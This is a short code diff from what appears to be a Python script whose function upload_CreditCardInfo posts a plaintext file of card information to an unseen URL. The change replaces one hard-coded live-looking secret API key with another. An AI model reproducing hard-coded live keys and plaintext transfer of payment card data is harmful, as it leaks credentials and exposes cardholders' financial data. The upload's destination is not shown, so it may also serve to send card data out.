@@ -98,7 +98,7 @@ def upload_CreditCardInfo():
     files = { "filePath": ("cardInformation.txt", open("cardInformation.txt", "rb"), "text/plain") }
     headers = {
         "accept": "application/json",
-        "X-API-Key": "sk_live_84229598-02f7-4804-8a40-ffedc3c0a43e"
+        "X-API-Key": "sk_live_508146f3-74e7-4769-80cb-39dd156fead3"
     }
     response = requests.post(url, files=files, headers=headers)
     return "success"
